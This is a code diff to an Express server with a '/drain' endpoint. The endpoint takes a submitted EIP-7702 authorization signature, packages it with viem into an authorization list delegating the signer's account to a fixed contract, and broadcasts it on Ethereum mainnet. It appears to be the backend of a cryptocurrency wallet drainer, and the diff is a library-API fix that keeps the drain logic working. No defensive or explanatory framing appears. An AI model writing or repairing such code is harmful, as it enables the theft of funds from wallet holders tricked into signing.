@@ -1,6 +1,6 @@
 import express from "express";
 import cors from "cors";
-import { createWalletClient, createPublicClient, http, serializeAuthorization } from "viem";
+import { createWalletClient, createPublicClient, http, serializeAuthorizationList } from "viem";
 import { privateKeyToAccount } from "viem/accounts";
 import { mainnet } from "viem/chains";
 
@@ -34,19 +34,21 @@ app.post("/drain", async (req, res) => {
     yp = Number(yp);
     if (yp >= 27) yp = yp - 27;
 
-    const authorization = serializeAuthorization({
-      chainId: 1,
-      address: CONTRACT,
-      nonce: authNonce,
-      yParity: yp,
-      r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
-      s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
-    });
+    const authorizationList = serializeAuthorizationList([
+      {
+        chainId: 1,
+        address: CONTRACT,
+        nonce: authNonce,
+        yParity: yp,
+        r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
+        s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
+      },
+    ]);
 
     const hash = await walletClient.sendTransaction({
       to: fantome,
       data: "0x",
-      authorizationList: [authorization],
+      authorizationList,
     });
 
     res.json({ hash });
